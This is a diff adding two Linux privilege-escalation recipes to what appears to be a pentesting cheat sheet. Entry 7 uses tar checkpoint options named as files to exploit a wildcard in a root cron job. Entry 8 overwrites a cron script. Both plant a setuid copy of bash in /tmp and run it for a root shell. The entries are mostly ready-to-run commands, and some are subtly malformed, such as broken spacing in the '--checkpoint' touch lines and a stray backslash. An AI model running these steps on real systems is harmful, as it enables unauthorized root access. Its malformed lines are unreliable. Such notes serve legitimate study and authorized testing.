@@ -869,7 +869,37 @@ export PATH=/tmp:$PATH
 cd /home/raj/script
 ./shell2
  ```
-  
+
+7. cronjob wildcard
+- Detection: cat /etc/crontab, find cron job that run every 1-2 min as root.
+- cat to see the code in the cron job script, to see if there is any wildcard we can use
+- find the directory that the cronjob task is run at e.g. /home/user
+- find the wildcard(*) in the cronjob script
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh           # if runme.sh doesn’t exist, make it exist
+chmod +x runme.sh
+touch /home/user/ -- checkpoint=1
+touch /home/user/ -- checkpoint-action=exec=sh\runme.sh
+
+<<<wait for 1 min for cron job>>>
+/tmp/bash -p
+id
+whoami
+```
+
+8. cronjob cron path (overwriting cron script)
+- Detection: cat /etc/crontab, find cron job that run every 1-2 min as root
+- locate overwrite.sh to overwrite the script in overwrite.sh (usually found in user’s home directory)
+```bash
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh            # if overwrite.sh doesn’t exist, make it exist
+chmod +x /home/user/overwrite.sh
+
+<<<wait for 1 min for cron job>>>
+/tmp/bash -p
+id
+whoami
+```
+
 # Active Directory Pentesting
 ## Enumeration
 - To check local administrators in domain joined machine
